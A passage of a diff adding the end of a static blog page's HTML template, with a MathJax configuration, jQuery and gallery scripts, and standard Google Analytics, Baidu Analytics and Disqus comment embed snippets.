+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131778492-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?da32760b25f029bfe0c4abfc646f5f7a";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'blog-tw5j2p4htr';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
